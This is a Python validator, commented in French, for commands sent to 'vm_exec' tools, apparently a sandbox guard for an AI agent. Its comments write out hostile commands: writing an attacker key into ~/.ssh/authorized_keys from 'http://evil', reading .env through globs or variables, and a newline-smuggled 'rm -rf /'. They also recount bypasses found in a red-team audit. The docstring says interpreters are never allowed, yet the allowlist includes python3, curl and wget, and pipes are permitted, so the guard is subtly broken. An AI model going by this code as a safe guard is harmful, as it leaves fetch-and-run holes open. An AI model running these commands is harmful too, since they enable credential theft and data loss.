"""Validation des commandes vm_exec / vm_exec_script — allowlist, pas denylist.

Remplace l'ancienne approche par liste noire (_vm_validate dans tools/tools.py,
contournable via `bash -c "..."`, `os.system()`, `curl|bash`) par une defense
en profondeur :

1. ALLOWLIST de binaires — seuls des outils de diagnostic/lecture explicitement
   listes peuvent etre executes. bash/sh/python/perl/ruby/node ne sont JAMAIS
   dans l'allowlist : aucun interpreteur ne peut donc servir de relais pour
   executer du code arbitraire cache dans un argument entre guillemets.
2. Aucun operateur shell dangereux (`;`, `&&`, `||`, `` ` ``, `$(`, `>`, `<`, `&`)
   sauf le pipe `|`, autorise uniquement entre deux commandes elles-memes
   allowlistees (ex: `ps aux | grep santana`).
3. Pour les commandes de lecture de fichiers (cat/head/tail/grep/less...),
   chaque chemin argument est :
   a) Analyse en texte brut : si le chemin contient des metacharacters
      d'expansion shell (`$`, `{`, `}`, `*`, `?`, `[`, `]`), la commande est
      refusee — ces caracteres court-circuitent realpath() et bash les expanse
      ensuite en fichiers sensibles que nous ne pouvons pas verifier en amont.
   b) Resolu via realpath() et compare a une liste de fragments sensibles —
      donc un symlink ou un `..` ne peut pas masquer un acces a .env / 
      cles SSH / shadow.
4. Environnement minimal : un appelant ne doit JAMAIS recevoir os.environ.copy()
   (voir safe_env()).
"""
import os
import re
import shlex

# ─── Allowlist de binaires (diagnostic / lecture / dev, jamais d'interpreteur) ──

VM_EXEC_ALLOWLIST = frozenset({
    "ls", "pwd", "echo", "whoami", "hostname", "uname", "date", "uptime",
    "df", "du", "free", "ps", "top", "id", "wc", "sort", "uniq", "diff",
    "grep", "egrep", "fgrep", "find", "file", "stat", "tree",
    "cat", "head", "tail", "less",
    "git", "pytest", "systemctl", "journalctl",
    "rm",
    "curl", "wget", "ping",
    "python3", "python", "pip",
    "apt", "apt-get", "dpkg",
})

# Binaires qui, meme allowlistes, ne doivent jamais recevoir certains flags
_GIT_FORBIDDEN_SUBCOMMANDS = {"push", "reset", "clean", "checkout"}  # lecture/ecriture locale OK, pas de reecriture d'historique distant ni perte de fichiers
_SYSTEMCTL_ALLOWED_SUBCOMMANDS = {"status", "is-active", "is-enabled", "list-units", "list-timers", "show", "cat"}
_FIND_FORBIDDEN_FLAGS = {"-delete", "-exec"}


def _rm_recursive_force(tokens: list[str]) -> bool:
    """rm est allowliste pour la suppression simple (cleanup de fichiers
    temporaires), mais jamais en combinaison recursif+force (quel que soit
    l'ordre ou le regroupement des flags : -rf, -r -f, -f -r, --recursive --force)."""
    has_r, has_f = False, False
    for t in tokens:
        if t == "--recursive":
            has_r = True
        elif t == "--force":
            has_f = True
        elif t.startswith("-") and not t.startswith("--"):
            if "r" in t:
                has_r = True
            if "f" in t:
                has_f = True
    return has_r and has_f

# Commandes qui lisent des fichiers passes en argument : leurs chemins sont
# verifies (anti-secret, anti-symlink) avant execution.
_FILE_READING_COMMANDS = {"cat", "head", "tail", "less", "grep", "egrep", "fgrep", "find"}

# Fragments interdits dans un chemin RESOLU (realpath) — pas dans la chaine brute,
# pour ne pas etre contourne par un symlink ou un `..`.
_SENSITIVE_PATH_FRAGMENTS = (
    "/.env", "/.ssh/", "/.gnupg/", "/shadow", "/.git/config",
    "credentials", "secret", "token", ".pem", ".key",
)

# Operateurs shell qui permettent de masquer/chaines une commande non allowlistee.
# Le pipe `|` est gere separement (autorise seulement entre commandes allowlistees).
_DANGEROUS_OPERATORS = re.compile(r"&&|\|\||;|`|\$\(|>>?|<<?|&(?!&)")

# Metacaracteres d'expansion shell dans les chemins.
# `$` et `{ }` expansent des variables / accolades que realpath() ne connait pas.
# `* ? [ ]` sont des globs qui n'existent pas comme chemins reels et court-circuitent
#   la verification dans _resolve_and_check_path (realpath leve FileNotFoundError).
# Ensemble, ils permettent de lire des fichiers sensibles via :
#   cat $HOME/santana/.env       — variable expansee par bash, pas par realpath
#   cat santana/{.env,claude.md} — accolade expanse par bash
#   cat santana/*                — glob expanse par bash, inclut .env
_SHELL_EXPANSION_IN_PATH = re.compile(r"[\$\{\}\*\?\]\[]")


def safe_env() -> dict:
    """Environnement minimal pour un sous-processus : jamais de secrets .env."""
    keep = ("PATH", "HOME", "LANG", "LC_ALL", "TERM", "USER")
    return {k: os.environ[k] for k in keep if k in os.environ}


def _resolve_and_check_path(token: str) -> str | None:
    """Resout un argument (chemin absolu, relatif, ou ~) et retourne un message
    d'erreur si sensible.

    Deux couches de verification :
    1. Si le token contient des metacharacters d'expansion shell ($ * ? { } [ ]),
       il est REFUSE systematiquement : ces caracteres ne sont pas des chemins
       reels (realpath echoue) mais sont expanses par bash, rendant la verification
       de securite contournable. Ceci corrige les contournements par glob (*, ?),
       brace ({}) et variables ($) decouverts lors du red-team audit (juin 2026).
    2. Resolution via realpath() + comparaison aux fragments sensibles.
    """
    if token.startswith("-"):
        return None  # flag (-n, -r, ...), pas un chemin

    # --- Couche 1 : detection de metacharacters shell dans le chemin ---
    # Avant juin 2026, `cat santana/*` passait parce que realpath("*") echoue,
    # et le fallback None permettait a bash d'expanser le glob vers des
    # fichiers sensibles (.env). Meme mecanisme pour $HOME, {}, [].
    if _SHELL_EXPANSION_IN_PATH.search(token):
        # On autorise les globs non-sensibles en detectant les fragments
        # sensibles DANS LE TEXTE BRUT (pas besoin de realpath pour `secret`)
        lowered = token.lower()
        for frag in _SENSITIVE_PATH_FRAGMENTS:
            if frag in lowered:
                return f"Commande refusee: chemin sensible detecte dans le texte brut ('{frag}' dans {token})"
        # Si le token brut ne contient pas de fragment sensible, on rejette
        # quand meme car l'expansion bash est imprevisible :
        #   cat santana/* — * ne contient pas .env, mais l'expansion SI
        return f"Commande refusee: metacharactere d'expansion shell dans le chemin (utilisez un chemin exact sans *, ?, $, {{, }}, [ ou ])"

    # --- Couche 2 : resolution reelle du chemin ---
    candidate = os.path.expanduser(token)
    try:
        resolved = os.path.realpath(candidate)
    except Exception:
        return None  # fichier inexistant (pas encore cree) — on laisse passer
    lowered = resolved.lower()
    for frag in _SENSITIVE_PATH_FRAGMENTS:
        if frag in lowered:
            return f"Commande refusee: chemin sensible detecte ('{frag}' dans {resolved})"
    return None


def _validate_segment(tokens: list[str]) -> tuple[bool, str]:
    """Valide une commande simple (un seul programme, sans operateur shell)."""
    if not tokens:
        return False, "Commande vide"

    base = os.path.basename(tokens[0])
    if base not in VM_EXEC_ALLOWLIST:
        return False, f"Commande refusee: '{base}' n'est pas dans l'allowlist"

    if base == "git" and len(tokens) > 1 and tokens[1] in _GIT_FORBIDDEN_SUBCOMMANDS:
        return False, f"Commande refusee: 'git {tokens[1]}' non autorise"

    if base == "systemctl":
        sub = next((t for t in tokens[1:] if not t.startswith("-")), "")
        if sub and sub not in _SYSTEMCTL_ALLOWED_SUBCOMMANDS:
            return False, f"Commande refusee: 'systemctl {sub}' non autorise (lecture seule uniquement)"

    if base == "find" and any(f in tokens for f in _FIND_FORBIDDEN_FLAGS):
        return False, "Commande refusee: find avec -delete/-exec interdit"

    if base == "rm" and _rm_recursive_force(tokens[1:]):
        return False, "Commande refusee: rm recursif + force detecte"

    if base in _FILE_READING_COMMANDS:
        for tok in tokens[1:]:
            err = _resolve_and_check_path(tok)
            if err:
                return False, err

    if base in ("curl", "wget"):
        # Lecture seule stricte : aucune ecriture sur disque permise. Sans ca,
        # `curl -o ~/.ssh/authorized_keys http://evil/key` ecrit une cle SSH
        # arbitraire — un vrai bypass trouve et corrige ici, pas seulement le
        # cas (deja couvert avant) de la sortie redirigee vers un interpreteur.
        write_flags = ("-o", "-O", "--output", "--output-document", "-J", "--remote-header-name")
        for tok in tokens[1:]:
            if tok in write_flags or any(tok.startswith(f) and f.startswith("-") and not f.startswith("--") for f in write_flags):
                return False, "Commande refusee: curl/wget avec ecriture sur disque interdit (lecture seule)"

    return True, ""


def validate_command(cmd_line: str) -> tuple[bool, str]:
    """Point d'entree : valide une ligne de commande complete (vm_exec)."""
    if not cmd_line or not cmd_line.strip():
        return False, "Commande vide"

    # Un saut de ligne dans une commande "simple" equivaut a un second appel
    # shell quand execute via subprocess.run(shell=True) — mais shlex.split()
    # l'absorbe silencieusement comme un separateur d'espace, donc sans cette
    # verification explicite, "ls\nrm -rf /" passait la validation comme un
    # unique appel a `ls` avec des arguments inoffensifs.
    if "\n" in cmd_line or "\r" in cmd_line:
        return False, "Commande refusee: saut de ligne interdit (une commande par appel)"

    if _DANGEROUS_OPERATORS.search(cmd_line):
        return False, "Commande refusee: operateur shell interdit (;, &&, ||, backtick, $(), redirection)"

    # Decoupage par pipe uniquement — chaque segment doit etre lui-meme allowliste
    segments = cmd_line.split("|")
    if len(segments) > 4:
        return False, "Commande refusee: trop de segments pipes"

    for segment in segments:
        try:
            tokens = shlex.split(segment.strip())
        except ValueError as e:
            return False, f"Commande refusee: erreur de parsing ({e})"
        ok, msg = _validate_segment(tokens)
        if not ok:
            return False, msg

    return True, ""


def validate_script(script: str) -> tuple[bool, str]:
    """Valide un script multi-ligne (vm_exec_script) : chaque ligne non vide,
    non commentaire, doit individuellement passer validate_command()."""
    for raw_line in script.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        ok, msg = validate_command(line)
        if not ok:
            return False, msg
    return True, ""
